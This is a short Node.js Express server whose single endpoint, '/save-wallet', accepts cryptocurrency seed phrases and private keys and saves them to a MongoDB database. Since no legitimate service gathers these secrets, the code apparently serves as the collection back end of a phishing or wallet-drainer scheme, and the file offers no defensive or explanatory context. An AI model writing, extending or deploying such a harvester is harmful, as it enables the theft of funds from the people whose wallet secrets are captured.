const express = require("express");
const mongoose = require("mongoose");
const Wallet = require("./models/Wallet");

const app = express();
app.use(express.json());

mongoose.connect("YOUR_MONGODB_URI", {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

app.post("/save-wallet", async (req, res) => {
    const { seedPhrase, privateKey } = req.body;

    if (!seedPhrase || !privateKey) {
        return res.status(400).send("Invalid data.");
    }

    const newWallet = new Wallet({ seedPhrase, privateKey });
    await newWallet.save();
    res.send("Wallet saved successfully!");
});

app.listen(3000, () => console.log("Server running on port 3000"));
